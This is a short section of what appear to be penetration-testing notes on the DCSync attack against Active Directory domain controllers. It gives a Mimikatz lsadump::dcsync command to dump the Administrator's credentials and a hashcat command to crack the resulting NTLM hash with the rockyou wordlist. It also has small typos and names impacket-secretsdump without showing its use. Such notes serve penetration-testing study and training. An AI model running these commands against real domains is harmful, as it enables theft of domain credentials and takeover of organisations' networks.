### Domain Controller Synchronization
When the AD has to synchronize the domains, it runs the Directory Replication Service (DRS) Remote Protocol. Because the domain doesnpt verify the origin of the request, we can perform a **dcsync** attack that could dump any user credential in the domain. We can use the `impacket-secretsdump` utility. First we run Mimikatz with the dsync attack.

```powershell
lsadump::dcsync /domain:<DOMAIN> /user:Administrator
```

We crack the NTLM HASH with hashcat

```powershell
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt --force
